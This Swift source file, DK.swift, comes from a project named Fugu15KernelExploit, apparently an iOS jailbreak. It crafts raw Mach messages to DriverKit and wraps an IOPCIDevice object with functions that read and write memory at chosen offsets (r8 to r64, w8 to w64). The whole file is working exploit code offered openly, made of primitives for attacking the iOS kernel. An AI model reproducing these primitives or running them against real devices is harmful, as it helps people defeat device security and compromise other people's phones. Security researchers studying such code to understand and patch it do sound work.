//
//  DK.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright Â© 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import SwiftUtils
import IOKit_iOS
import Darwin

public enum DKError: Error {
    case rpcError(description: String)
    case requestFailed(description: String, file: String = #file, line: Int = #line, function: String = #function)
    case failedToRegisterClass(className: String, super: String)
}

public protocol DriverKitObject {
    var machMsgObjData: Data { get }
}

extension DriverKitObject {
    func machMsgObjPort(_ port: mach_port_t) -> Data {
        var msg = Data()
        
        msg.appendGeneric(value: port)
        msg.appendGeneric(value: 0 as UInt32) // pad1
        msg.appendGeneric(value: 0 as UInt16) // pad2
        msg.appendGeneric(value: UInt8(MACH_MSG_TYPE_COPY_SEND))  // disposition
        msg.appendGeneric(value: UInt8(MACH_MSG_PORT_DESCRIPTOR)) // type
        
        return msg
    }
}

extension mach_port_t: DriverKitObject {
    public var machMsgObjData: Data {
        return machMsgObjPort(self)
    }
}

class DriverKit: DriverKitObject {
    var machMsgObjData: Data { machMsgObjPort(serverPort) }
    
    let _serverPort: mach_port_t
    var serverPort: mach_port_t { newServerPort ?? _serverPort }
    let ioPort: io_connect_t?
    var classes: [String: mach_port_t] = [:]
    var newServerPort: mach_port_t?
    
    init(svPort: mach_port_t, ioPort: io_connect_t?) {
        self._serverPort = svPort
        self.ioPort = ioPort
    }
    
    static func parseResponse(response: Data) throws -> (objs: [mach_port_t], id: UInt64, flags: UInt64, objCnt: UInt64, resultCode: UInt32?, other: Data) {
        // Read size
        var response = response
        let sz = response.getGeneric(type: UInt32.self, offset: 4)
        response = response.subdata(in: 0..<Data.Index(sz))
        
        // Read objects
        let bodyCount = response.getGeneric(type: UInt32.self, offset: 24)
        var curOff: UInt = 28
        var resultObjs: [mach_port_t] = []
        for _ in 0..<bodyCount {
            let type = response.getGeneric(type: UInt8.self, offset: curOff + 11)
            switch type {
                case UInt8(MACH_MSG_PORT_DESCRIPTOR):
                    let port = response.getGeneric(type: UInt32.self, offset: curOff)
                    resultObjs.append(port)
                    curOff += 12
                    
                case UInt8(MACH_MSG_OOL_DESCRIPTOR):
                    curOff += 16
                    
                default:
                    throw DKError.rpcError(description: "Received bad response from kernel!")
            }
        }
        
        let id = response.getGeneric(type: UInt64.self, offset: curOff + 0)
        let flags = response.getGeneric(type: UInt64.self, offset: curOff + 8)
        let objCnt = response.getGeneric(type: UInt64.self, offset: curOff + 16)
        
        // Rest is raw data
        let other = response.tryAdvance(by: Int(curOff) + 24)
        return (objs: resultObjs, id: id, flags: flags, objCnt: objCnt, resultCode: other.tryGetGeneric(type: UInt32.self), other: other)
    }
    
    func createRPCMessage(msgId: UInt64, objects: [DriverKitObject], data: Data, overrideRefs: UInt64? = nil) -> Data {
        // First build the structure
        var msg = Data()
        
        // Message header
        // Bits and Size, will be prepended later
        let msgBits: UInt32 = UInt32(MACH_MSG_TYPE_COPY_SEND) | (UInt32(MACH_MSG_TYPE_MAKE_SEND) << 8) | MACH_MSGH_BITS_COMPLEX
        
        msg.appendGeneric(value: serverPort)           // remote port
        msg.appendGeneric(value: 0 as mach_port_t)     // local port
        msg.appendGeneric(value: 0 as UInt32)          // voucher port
        msg.appendGeneric(value: 0x4DA2B68C as UInt32) // id
        
        // Message body
        msg.appendGeneric(value: UInt32(objects.count))
        
        // Message objects
        for o in objects {
            msg.append(o.machMsgObjData)
        }
        
        // IORPC body
        msg.appendGeneric(value: msgId)       // Message ID
        msg.appendGeneric(value: 0 as UInt64) // Flags
        msg.appendGeneric(value: overrideRefs ?? UInt64(objects.count)) // Number of objects
        
        // Reserve space for the objects
        for _ in 0..<(overrideRefs ?? UInt64(objects.count)) {
            msg.appendGeneric(value: 0 as UInt64)
        }
        
        // Append other data
        msg.append(data)
        
        // Now bits and size
        var bitsSize = Data(fromObject: msgBits)
        bitsSize.appendGeneric(value: UInt32(msg.count + 8))
        msg = bitsSize + msg
        
        return msg
    }
    
    func rpcDoSend(msg: inout Data) throws -> (objs: [mach_port_t], id: UInt64, flags: UInt64, objCnt: UInt64, resultCode: UInt32?, other: Data) {
        let replyPort = mig_get_reply_port()
        var kr = msg.withUnsafeMutableBytes { ptr in
            let hdr = ptr.baseAddress.unsafelyUnwrapped.assumingMemoryBound(to: mach_msg_header_t.self)
            hdr.pointee.msgh_local_port = replyPort
            
            return mach_msg_send(hdr)
        }
        
        if kr != KERN_SUCCESS {
            throw DKError.rpcError(description: "mach_msg_send failed!")
        }
        
        guard let rcvBuf = malloc(8192) else {
            throw DKError.rpcError(description: "Failed to allocate receive buffer!")
        }
        
        let hdr = rcvBuf.assumingMemoryBound(to: mach_msg_header_t.self)
        hdr.pointee.msgh_local_port = replyPort
        hdr.pointee.msgh_size = 8192
        
        kr = mach_msg_receive(hdr)
        if kr != KERN_SUCCESS {
            throw DKError.rpcError(description: "mach_msg_receive failed!")
        }
        
        // Transfer receive buffer to a Data object
        // The data object now owns it
        let response = Data(bytesNoCopy: rcvBuf, count: 8192, deallocator: .free)
        
        return try Self.parseResponse(response: response)
    }
    
    func rpc(msgId: UInt64, objects: [DriverKitObject], data: Data, overrideRefs: UInt64? = nil) throws -> (objs: [mach_port_t], id: UInt64, flags: UInt64, objCnt: UInt64, resultCode: UInt32?, other: Data) {
        var msg = createRPCMessage(msgId: msgId, objects: objects, data: data, overrideRefs: overrideRefs)
        
        return try rpcDoSend(msg: &msg)
    }
    
    func getBuiltinClass(withName: String, andSuper: String = "") throws -> mach_port_t? {
        if let res = classes[withName] {
            return res
        }
        
        guard ioPort != nil else {
            return nil
        }
        
        var desc = Data()
        
        var name = withName
        while name.count < 96 {
            name += "\0"
        }
        desc.append(name.data(using: .utf8)!)
        
        var superName = andSuper
        while superName.count < 96 {
            superName += "\0"
        }
        desc.append(superName.data(using: .utf8)!)
        
        desc.appendGeneric(value: 0 as UInt32) // methodOptionsSize
        desc.appendGeneric(value: 0 as UInt32) // methodOptionsOffset
        desc.appendGeneric(value: 0 as UInt32) // metaMethodOptionsSize
        desc.appendGeneric(value: 0 as UInt32) // metaMethodOptionsOffset
        desc.appendGeneric(value: 0 as UInt32) // queueNamesSize
        desc.appendGeneric(value: 0 as UInt32) // queueNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // methodNamesSize
        desc.appendGeneric(value: 0 as UInt32) // methodNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // metaMethodNamesSize
        desc.appendGeneric(value: 0 as UInt32) // metaMethodNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // pad
        
        desc.appendGeneric(value: 0 as UInt64) // flags
        
        for _ in 0..<8 {
            desc.appendGeneric(value: 0 as UInt64) // resv1
        }
        
        // Prepend size
        desc = Data(fromObject: UInt32(desc.count) + 4) + desc
        
        var outCnt: UInt32 = 2
        var out = Data(repeating: 0, count: 8)
        let res = desc.withUnsafeBytes { (buf: UnsafeRawBufferPointer) in
            return out.withUnsafeMutableBytes { (outBuf: UnsafeMutableRawBufferPointer) in
                return (IOConnectCallMethod(ioPort.unsafelyUnwrapped, 0x00001000, nil, 0, buf.baseAddress!, buf.count, outBuf.baseAddress!.assumingMemoryBound(to: UInt64.self), &outCnt, nil, nil), outBuf.baseAddress!.assumingMemoryBound(to: UInt32.self).pointee)
            }
        }
        
        guard res.0 == KERN_SUCCESS else {
            throw DKError.failedToRegisterClass(className: withName, super: andSuper)
        }
        
        classes[withName] = res.1
        
        return res.1
    }
}

class IOPCIDevice: DriverKitObject {
    let dk:  DriverKit
    let dev: mach_port_t
    
    var machMsgObjData: Data { machMsgObjPort(dev) }
    
    var r64Msg: Data
    var r32Msg: Data
    var r16Msg: Data
    var r8Msg:  Data
    
    var w64Msg: Data
    var w32Msg: Data
    var w16Msg: Data
    var w8Msg:  Data
    
    private static func makeMsg(dk: DriverKit, dev: mach_port_t, action: UInt64) -> Data {
        var data = Data(fromObject: action)    // action
        data.appendGeneric(value: 0 as UInt64) // offset
        data.appendGeneric(value: 0 as UInt64) // data
        data.appendGeneric(value: 0 as UInt32) // flags
        
        return dk.createRPCMessage(msgId: 0x8d1327073fe3df0b, objects: [dev, dev], data: data)
    }
    
    init(dk: DriverKit, device: mach_port_t) {
        self.dk  = dk
        self.dev = device
        
        self.r64Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x80100)
        self.r32Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x40100)
        self.r16Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x20100)
        self.r8Msg  = Self.makeMsg(dk: dk, dev: dev, action: 0x10100)
        
        self.w64Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x80200)
        self.w32Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x40200)
        self.w16Msg = Self.makeMsg(dk: dk, dev: dev, action: 0x20200)
        self.w8Msg  = Self.makeMsg(dk: dk, dev: dev, action: 0x10200)
    }
    
    func r64(_ offset: UInt64) throws -> UInt64 {
        r64Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
        }
        
        guard let val = try dk.rpcDoSend(msg: &r64Msg).other.tryGetGeneric(type: UInt64.self) else {
            throw DKError.requestFailed(description: "r64 failed!")
        }
        
        return val
    }
    
    func r32(_ offset: UInt64) throws -> UInt32 {
        r32Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
        }
        
        guard let val = try dk.rpcDoSend(msg: &r32Msg).other.tryGetGeneric(type: UInt32.self) else {
            throw DKError.requestFailed(description: "r32 failed!")
        }
        
        return val
    }
    
    func r16(_ offset: UInt64) throws -> UInt16 {
        r16Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
        }
        
        guard let val = try dk.rpcDoSend(msg: &r16Msg).other.tryGetGeneric(type: UInt16.self) else {
            throw DKError.requestFailed(description: "r16 failed!")
        }
        
        return val
    }
    
    func r8(_ offset: UInt64) throws -> UInt8 {
        r8Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
        }
        
        guard let val = try dk.rpcDoSend(msg: &r8Msg).other.tryGetGeneric(type: UInt8.self) else {
            throw DKError.requestFailed(description: "r8 failed!")
        }
        
        return val
    }
    
    func w64(_ offset: UInt64, value: UInt64) throws {
        w64Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
            ptr.baseAddress!.advanced(by: end - (4 + 8)).assumingMemoryBound(to: UInt64.self).pointee = value
        }
        
        _ = try dk.rpcDoSend(msg: &w64Msg)
    }
    
    func w32(_ offset: UInt64, value: UInt32) throws {
        w32Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
            ptr.baseAddress!.advanced(by: end - (4 + 8)).assumingMemoryBound(to: UInt64.self).pointee = UInt64(value)
        }
        
        _ = try dk.rpcDoSend(msg: &w32Msg)
    }
    
    func w16(_ offset: UInt64, value: UInt16) throws {
        w16Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
            ptr.baseAddress!.advanced(by: end - (4 + 8)).assumingMemoryBound(to: UInt64.self).pointee = UInt64(value)
        }
        
        _ = try dk.rpcDoSend(msg: &w16Msg)
    }
    
    func w8(_ offset: UInt64, value: UInt8) throws {
        w8Msg.withUnsafeMutableBytes { ptr in
            let end = ptr.count
            ptr.baseAddress!.advanced(by: end - (4 + 8 + 8)).assumingMemoryBound(to: UInt64.self).pointee = offset
            ptr.baseAddress!.advanced(by: end - (4 + 8)).assumingMemoryBound(to: UInt64.self).pointee = UInt64(value)
        }
        
        _ = try dk.rpcDoSend(msg: &w8Msg)
    }
}
